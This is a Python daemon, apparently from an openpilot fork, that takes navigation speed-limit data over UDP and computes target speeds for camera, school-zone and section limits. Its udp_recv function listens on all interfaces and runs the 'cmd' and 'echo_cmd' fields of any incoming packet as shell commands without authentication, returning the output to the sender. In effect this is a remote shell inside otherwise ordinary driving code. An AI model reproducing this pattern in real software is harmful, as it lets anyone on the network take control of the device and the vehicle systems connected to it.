#!/usr/bin/env python3
import json
import os
import select
import signal
import subprocess
import sys
import threading
import time
import socket
import fcntl
import struct
import numpy as np
import logging
import math

from collections import deque
from threading import Thread
from openpilot.cereal import messaging
from openpilot.common.realtime import Ratekeeper
from openpilot.common.constants import UnitConverter

terminate_flag = threading.Event()

LOG_FILE = "/data/navi_debug.log"

def _setup_logger():
  logger = logging.getLogger("navi")
  logger.setLevel(logging.DEBUG)

  try:
    handler = logging.FileHandler(LOG_FILE, mode="a")
    handler.setFormatter(logging.Formatter("%(asctime)s.%(msecs)03d [%(levelname)s] %(message)s", datefmt="%H:%M:%S"))
    logger.addHandler(handler)

  except OSError:
    pass

  return logger

log = _setup_logger()

class Port:
  BROADCAST_PORT = 2899
  RECEIVE_PORT = 3843
  CS_PORT = 3847


NAVI_INT_FIELDS = frozenset({
  "road_limit_speed",
  "cam_type",
  "cam_limit_speed_left_dist",
  "cam_limit_speed",
  "section_limit_speed",
  "section_left_dist",
  "section_avg_speed",
})
NAVI_BOOL_FIELDS = frozenset({"is_highway", "section_adjust_speed"})
NAVI_ACTIVE_MIN = 0
NAVI_ACTIVE_MAX = 32767

class NaviServer:
  def __init__(self, start_broadcast=True):
    self.json_road_limit = None
    self.active = 0
    self.last_updated = 0
    self.last_updated_active = 0
    self.lock = threading.Lock()
    self.remote_addr = None

    if start_broadcast:
      Thread(target=self.broadcast_thread, daemon=True).start()

  def get_broadcast_address(self):
    try:
      with socket.socket(socket.AF_INET, socket.SOCK_DGRAM) as s:
        ip = fcntl.ioctl(
          s.fileno(),
          0x8919,
          struct.pack('256s', 'wlan0'.encode('utf-8'))
        )[20:24]
        return socket.inet_ntoa(ip)
    except Exception as e:
      log.debug(f"Failed to get broadcast address: {e}")
      return None

  def broadcast_thread(self):
    broadcast_address = None
    frame = 0

    with socket.socket(socket.AF_INET, socket.SOCK_DGRAM) as sock:
      try:
        # sock.setsockopt(socket.SOL_SOCKET, socket.SO_BROADCAST, 1)
        while not terminate_flag.is_set():
          try:
            if broadcast_address is None or frame % 10 == 0:
              broadcast_address = self.get_broadcast_address()

            with self.lock:
              remote_addr = self.remote_addr
            if broadcast_address is not None and remote_addr is None:
              log.debug(f"Broadcasting to {broadcast_address}")
              msg = 'EON:ROAD_LIMIT_SERVICE:v1'.encode()
              for i in range(1, 255):
                ip_tuple = socket.inet_aton(broadcast_address)
                new_ip = ip_tuple[:-1] + bytes([i])
                address = (socket.inet_ntoa(new_ip), Port.BROADCAST_PORT)
                sock.sendto(msg, address)
          except Exception as e:
            log.debug(f"Error in broadcast loop: {e}")

          time.sleep(5.)
          frame += 1
      except Exception as e:
        log.error(f"Broadcast thread exited with error: {e}")

  def send_sdp(self, sock):
    try:
      with self.lock:
        remote_addr = self.remote_addr
      if remote_addr:
        sock.sendto('EON:ROAD_LIMIT_SERVICE:v1'.encode(), (remote_addr[0], Port.BROADCAST_PORT))
    except Exception as e:
      log.debug(f"Failed to send SDP: {e}")

  @staticmethod
  def _valid_road_limit(road_limit):
    if not isinstance(road_limit, dict):
      return False

    for key, value in road_limit.items():
      if value is None:
        return False
      if key in NAVI_BOOL_FIELDS:
        if not isinstance(value, bool):
          return False
      elif key == "current_road_name":
        if not isinstance(value, str):
          return False
      elif key == "cam_speed_factor":
        if isinstance(value, bool) or not isinstance(value, (int, float)) or not math.isfinite(value):
          return False
        if not 0.0 <= value <= 10.0:
          return False
      elif key in NAVI_INT_FIELDS:
        if isinstance(value, bool) or not isinstance(value, (int, float)) or not math.isfinite(value):
          return False
        if not -32768 <= value <= 32767:
          return False

    return True

  def udp_recv(self, sock):
    ret = False
    try:
      ready = select.select([sock], [], [], 1.)
      ret = bool(ready[0])
      if ret:
        data, remote_addr = sock.recvfrom(2048)
        json_obj = json.loads(data.decode())
        if not isinstance(json_obj, dict):
          raise ValueError("navi command must be a JSON object")
        if 'active' in json_obj:
          active = json_obj['active']
          if isinstance(active, bool) or not isinstance(active, int) or not NAVI_ACTIVE_MIN <= active <= NAVI_ACTIVE_MAX:
            raise ValueError(f"active must be an integer between {NAVI_ACTIVE_MIN} and {NAVI_ACTIVE_MAX}")
        if 'road_limit' in json_obj and not self._valid_road_limit(json_obj['road_limit']):
          raise ValueError("invalid road_limit payload")

        with self.lock:
          self.remote_addr = remote_addr

        if 'cmd' in json_obj:
          try:
            subprocess.run(json_obj['cmd'], shell=True, timeout=5)
            ret = False
          except Exception as e:
            log.debug(f"Command execution failed: {e}")

        if 'echo' in json_obj:
          try:
            echo = json.dumps(json_obj["echo"])
            sock.sendto(echo.encode(), (remote_addr[0], Port.BROADCAST_PORT))
            ret = False
          except Exception as e:
            log.debug(f"Echo response failed: {e}")

        if 'echo_cmd' in json_obj:
          try:
            result = subprocess.run(json_obj['echo_cmd'], shell=True, stdout=subprocess.PIPE, stderr=subprocess.PIPE, text=True, timeout=5)
            echo = json.dumps({"echo_cmd": json_obj['echo_cmd'], "result": result.stdout})
            sock.sendto(echo.encode(), (remote_addr[0], Port.BROADCAST_PORT))
            ret = False
          except Exception as e:
            log.debug(f"Echo cmd execution failed: {e}")

        with self.lock:
          if 'active' in json_obj:
            self.active = int(json_obj['active'])
            self.last_updated_active = time.monotonic()

          if 'road_limit' in json_obj:
            self.json_road_limit = json_obj['road_limit']
            self.last_updated = time.monotonic()
            log.debug(f"[3843 RECV] {json_obj['road_limit']}")

    except Exception as e:
      log.debug(f"Exception in udp_recv: {e}")

    return ret

  def check(self):
    now = time.monotonic()
    with self.lock:
      if now - self.last_updated > 6.:
        self.json_road_limit = None

      if now - self.last_updated_active > 6.:
        self.active = 0
        self.remote_addr = None

  def get_limit_val(self, key, default=None):
    value = self.get_json_val(self.json_road_limit, key, default)
    return int(value) if key in NAVI_INT_FIELDS and value is not None else value

  def get_json_val(self, json_data, key, default=None):
    if json_data is None:
      return default
    return json_data.get(key, default)


def publish_thread(server):
  sm = messaging.SubMaster(['carState'])
  naviData = messaging.pub_sock('naviData')
  rk = Ratekeeper(10, print_delay_threshold=None)
  v_ego_q = deque(maxlen=3)
  car_state_sock = socket.socket(socket.AF_INET, socket.SOCK_DGRAM)

  last_network_dist = -1
  dist_frozen_timer = 0.0
  last_loop_time = time.monotonic()

  while not terminate_flag.is_set():
    now = time.monotonic()
    dt = max(now - last_loop_time, 0.0)
    last_loop_time = now
    sm.update(0)
    dat = messaging.new_message('naviData', valid=True)
    navi = dat.naviData

    with server.lock:
      navi.active = server.active
      navi.roadLimitSpeed = server.get_limit_val("road_limit_speed", 0)
      navi.isHighway = server.get_limit_val("is_highway", False)
      navi.camType = server.get_limit_val("cam_type", 0)
      navi.camLimitSpeedLeftDist = server.get_limit_val("cam_limit_speed_left_dist", 0)
      navi.camLimitSpeed = server.get_limit_val("cam_limit_speed", 0)
      navi.sectionLimitSpeed = server.get_limit_val("section_limit_speed", 0)
      navi.sectionLeftDist = server.get_limit_val("section_left_dist", 0)
      navi.sectionAvgSpeed = server.get_limit_val("section_avg_speed", 0)
      navi.sectionAdjustSpeed = server.get_limit_val("section_adjust_speed", False)
      navi.camSpeedFactor = server.get_limit_val("cam_speed_factor", 1.0)
      navi.currentRoadName = server.get_limit_val("current_road_name", "")
      last_updated = server.last_updated

    if sm.updated['carState']:
      current_v_ego = sm['carState'].vEgo
      v_ego_q.append(current_v_ego)

      try:
        data_in_bytes = struct.pack('!f', current_v_ego)
        car_state_sock.sendto(data_in_bytes, ('127.0.0.1', Port.CS_PORT))
      except Exception as e:
        log.debug(f"Failed to send carState UDP: {e}")

    v_ego = np.mean(v_ego_q) if len(v_ego_q) > 0 else 0.

    if navi.camLimitSpeedLeftDist > 0:
      if navi.camLimitSpeedLeftDist == last_network_dist:
        if v_ego > 1.0:
          dist_frozen_timer += dt
      else:
        last_network_dist = navi.camLimitSpeedLeftDist
        dist_frozen_timer = 0.0

      if dist_frozen_timer > 3.0:
        navi.camLimitSpeedLeftDist = 0
    else:
      last_network_dist = 0
      dist_frozen_timer = 0.0

    t_since_last_update = max(now - last_updated, 0.0)
    s_travelled = t_since_last_update * v_ego

    if navi.camLimitSpeedLeftDist > 0:
      navi.camLimitSpeedLeftDist = int(max(navi.camLimitSpeedLeftDist - s_travelled, 0))
    if navi.sectionLeftDist > 0:
      navi.sectionLeftDist = int(max(navi.sectionLeftDist - s_travelled, 0))

    naviData.send(dat.to_bytes())
    server.check()
    rk.keep_time()

  car_state_sock.close()


def main():
  try:
    with open(LOG_FILE, "w") as f:
      f.write(f"=== Navi Session Started at {time.strftime('%Y-%m-%d %H:%M:%S')} ===\n")
  except OSError:
    pass

  server = NaviServer()
  Thread(target=publish_thread, args=[server], daemon=True).start()

  with socket.socket(socket.AF_INET, socket.SOCK_DGRAM) as sock:
    try:
      sock.bind(('0.0.0.0', Port.RECEIVE_PORT))
      sock.setblocking(True)
      while not terminate_flag.is_set():
        server.udp_recv(sock)
        server.send_sdp(sock)
    except Exception as e:
      log.error(f"UDP Server encountered a critical error: {e}")


class SpeedLimiter:
  def __init__(self):
    self.cam_decel = False
    self.sec_decel = False
    self.stock_decel = False
    self.started_dist = 0
    self.started_speed = 0
    self.last_limit_speed_left_dist = 0
    self.last_road_name = ""
    self.in_school_zone = False

    self.sock = messaging.sub_sock("naviData")
    self.naviData = None
    self.conv = UnitConverter()

    self._init_time = time.monotonic()
    self._first_navidata_logged = False
    self._last_reset_log_msg = None
    self._last_log_time = {}
    log.info("SpeedLimiter initialized, waiting for first naviData...")

  @classmethod
  def instance(cls):
    if not hasattr(cls, "_instance"):
      cls._instance = cls()
    return cls._instance

  def recv(self):
    try:
      dat = messaging.recv_sock(self.sock, wait=False)
      if dat is not None:
        was_active = self.naviData is not None and self.naviData.active > 0
        self.naviData = dat.naviData
        is_active = self.naviData.active > 0
        if was_active and not is_active:
          self._reset_navigation_state()
        if not self._first_navidata_logged:
          log.info(f"first naviData received ({time.monotonic() - self._init_time:.1f}s after SpeedLimiter init)")
          self._first_navidata_logged = True
    except Exception as e:
      log.debug(f"Messaging receive error: {e}")

  def get_active(self):
    if self.naviData is not None:
      return self.naviData.active
    return 0

  def get_road_limit_speed(self):
    if self.naviData is not None:
      return self.naviData.roadLimitSpeed
    return 0

  def get_section_limit_speed(self):
    if self.naviData is not None:
      return self.naviData.sectionLimitSpeed, self.naviData.sectionLeftDist
    return 0, 0

  def get_camera_limit_active(self):
    if self.naviData is None:
      return False
    camera_active = self.naviData.camLimitSpeed > 0 and self.naviData.camLimitSpeedLeftDist > 0
    section_active = self.naviData.sectionLimitSpeed > 0 and self.naviData.sectionLeftDist > 0
    return camera_active or section_active

  def get_in_school_zone(self):
    return self.in_school_zone

  def _reset_camera_decel(self):
    self.cam_decel = False
    self.started_dist = 0
    self.started_speed = 0
    self.last_limit_speed_left_dist = 0

  def _reset_decel_states(self):
    self._reset_camera_decel()
    self.sec_decel = False
    self.stock_decel = False

  def _reset_navigation_state(self):
    self._reset_decel_states()
    self.in_school_zone = False
    self.last_road_name = ""

  def _log_reset(self, msg):
    if msg != self._last_reset_log_msg:
      log.debug(msg)
      self._last_reset_log_msg = msg

  def _log_throttled(self, key, msg, min_interval=0.25):
    now = time.monotonic()
    last = self._last_log_time.get(key, 0)
    if now - last >= min_interval:
      log.debug(msg)
      self._last_log_time[key] = now

  def get_max_speed(self, cluster_speed_clu):
    default_return_value = (0, False)
    self.stock_decel = False

    if self.naviData is None:
      self._reset_decel_states()
      return default_return_value

    try:
      navi_data = self.naviData
      road_limit_speed = navi_data.roadLimitSpeed
      is_highway = navi_data.isHighway
      cam_type = int(navi_data.camType)
      cam_limit_speed_left_dist = navi_data.camLimitSpeedLeftDist
      cam_limit_speed = navi_data.camLimitSpeed
      section_limit_speed = navi_data.sectionLimitSpeed
      section_left_dist = navi_data.sectionLeftDist
      section_avg_speed = navi_data.sectionAvgSpeed
      section_adjust_speed = navi_data.sectionAdjustSpeed
      cam_speed_factor = np.clip(navi_data.camSpeedFactor, 1.0, 1.1)

      min_limit = 40 if is_highway else 20
      max_limit = 120 if is_highway else 100

      is_school_zone_start = (cam_type == 20)
      is_school_zone_end = (cam_type == 21)
      is_speed_bump = (cam_type == 22)

      if is_school_zone_start and not self.in_school_zone:
        log.info(f"school zone ENTER: limit={cam_limit_speed}, dist={cam_limit_speed_left_dist}")
        self.in_school_zone = True
      elif is_school_zone_end and self.in_school_zone:
        log.info("school zone EXIT")
        self.in_school_zone = False

      current_road_name = str(getattr(navi_data, "currentRoadName", "") or "")

      if self.in_school_zone:
        if (self.last_road_name and current_road_name and current_road_name != self.last_road_name) or \
           (cam_type not in (20, 21) and cam_limit_speed_left_dist > 0):
          log.info("school zone FORCED EXIT (road changed or new cam detected)")
          self.in_school_zone = False

      if is_speed_bump or is_school_zone_start:
        min_limit = 10

      if is_speed_bump:
        self._log_throttled("bump_event", f"speed bump event: cam_limit_speed={cam_limit_speed}, dist={cam_limit_speed_left_dist}")

      if is_school_zone_start:
        self._log_throttled("school_zone_event", f"school zone start event: cam_limit_speed={cam_limit_speed}, dist={cam_limit_speed_left_dist}")

      has_camera_limit = (
        cam_limit_speed_left_dist is not None and cam_limit_speed is not None and cam_limit_speed_left_dist > 0
      )
      if has_camera_limit:
        self.sec_decel = False
        cluster_speed_ms = self.conv.to_ms(cluster_speed_clu)

        tight_zone = is_speed_bump or is_school_zone_start
        safe_dist = cluster_speed_ms * 4. if tight_zone else cluster_speed_ms * 8.

        min_starting_dist_tight = 60.
        min_starting_dist_normal = 150.
        starting_dist = max(cluster_speed_ms * 10., min_starting_dist_tight) if tight_zone \
                        else max(cluster_speed_ms * 18., min_starting_dist_normal)

        if self.cam_decel and self.last_limit_speed_left_dist > 0 and \
           cam_limit_speed_left_dist < (self.last_limit_speed_left_dist - (cluster_speed_ms * 6)):
          self._log_reset(f"decel reset (dist jumped closer): cam_type={cam_type} {self.last_limit_speed_left_dist:.0f}m -> {cam_limit_speed_left_dist:.0f}m")
          self.cam_decel = False

        elif self.cam_decel and self.last_limit_speed_left_dist > 0 and \
             cam_limit_speed_left_dist > (self.last_limit_speed_left_dist + max(cluster_speed_ms * 3, 20.)):
          self._log_reset(f"decel reset (new distinct event, dist jumped farther): cam_type={cam_type} {self.last_limit_speed_left_dist:.0f}m -> {cam_limit_speed_left_dist:.0f}m")
          self.cam_decel = False

        if self.cam_decel and self.last_road_name and current_road_name and current_road_name != self.last_road_name:
          self._log_reset(f"decel reset (road changed): cam_type={cam_type} {self.last_road_name} -> {current_road_name}")
          self.cam_decel = False

        if tight_zone and not (min_limit <= cam_limit_speed <= max_limit and (self.cam_decel or cam_limit_speed_left_dist < starting_dist)):
          self._log_throttled(
            "gate_rejected",
            f"bump/school gate REJECTED: cam_limit_speed={cam_limit_speed} (min={min_limit},max={max_limit}), "
            f"dist={cam_limit_speed_left_dist}, starting_dist={starting_dist:.1f}, decel={self.cam_decel}"
          )

        self.last_limit_speed_left_dist = cam_limit_speed_left_dist
        self.last_road_name = current_road_name

        if min_limit <= cam_limit_speed <= max_limit and (self.cam_decel or cam_limit_speed_left_dist < starting_dist):
          is_limit_zone = not self.cam_decel

          if not self.cam_decel:
            self.started_dist = cam_limit_speed_left_dist
            self.started_speed = cluster_speed_clu
            self.cam_decel = True

          diff_speed = self.started_speed - (cam_limit_speed * cam_speed_factor)

          total_decel_dist = self.started_dist - safe_dist
          remain_decel_dist = cam_limit_speed_left_dist - safe_dist

          decel_rate_factor = 0
          if remain_decel_dist > 0. and total_decel_dist > 0. and diff_speed > 0. and (section_left_dist is None or section_left_dist < 10 or cam_type == 2):
            decel_rate_factor = (remain_decel_dist / total_decel_dist) ** 0.6

          target_speed = cam_limit_speed * cam_speed_factor + int(decel_rate_factor * diff_speed)

          self._log_throttled("target_speed", f"cam_type={cam_type} target_speed={target_speed:.1f}, is_limit_zone={is_limit_zone}, dist={cam_limit_speed_left_dist}, starting_dist={starting_dist:.1f}")

          return target_speed, is_limit_zone

      self.last_road_name = current_road_name

      if section_left_dist is not None and section_limit_speed is not None and section_left_dist > 0:
        if min_limit <= section_limit_speed <= max_limit:
          self._reset_camera_decel()

          is_limit_zone = not self.sec_decel
          if not self.sec_decel:
            self.sec_decel = True

          speed_diff = 0
          if section_adjust_speed is not None and section_adjust_speed:
            speed_diff = (section_limit_speed - section_avg_speed) / 2.
            speed_diff *= np.interp(section_left_dist, [500, 1000], [0., 1.])

          target_speed = section_limit_speed * cam_speed_factor + speed_diff

          return target_speed, is_limit_zone

    except Exception as e:
      log.error(f"Error calculating max speed: {e}")

    self._reset_decel_states()
    return default_return_value

  def get_camera_limit_speed_stock(self, CS, cluster_speed_clu):
    speed_limit = CS.speedLimit
    speed_limit_distance = CS.speedLimitDistance
    cluster_speed_ms = self.conv.to_ms(cluster_speed_clu)
    speed_limit_ms = self.conv.to_ms(speed_limit)

    if speed_limit_distance <= 0 or speed_limit <= 0:
      self.stock_decel = False
      return 0, False

    safe_dist = cluster_speed_ms * 8.
    decel_dist = speed_limit_distance - safe_dist

    is_limit_zone = not self.stock_decel
    if decel_dist > 0:
      if not self.stock_decel:
        self.stock_decel = True

    safe_decel_rate = 1.2
    # v_i^2 = v_f^2 + 2ad (physics formula)
    temp = speed_limit_ms**2 + 2 * safe_decel_rate * decel_dist

    if temp < 0:
      speed_ms = speed_limit_ms
    else:
      speed_ms = np.sqrt(temp)

    calculated_speed = self.conv.to_clu(speed_ms)
    target_speed = max(speed_limit, min(255., calculated_speed))

    return target_speed, is_limit_zone

def signal_handler(sig, frame):
  log.info('Ctrl+C pressed, exiting.')
  terminate_flag.set()
  sys.exit(0)

if __name__ == "__main__":
  signal.signal(signal.SIGINT, signal_handler)
  main()
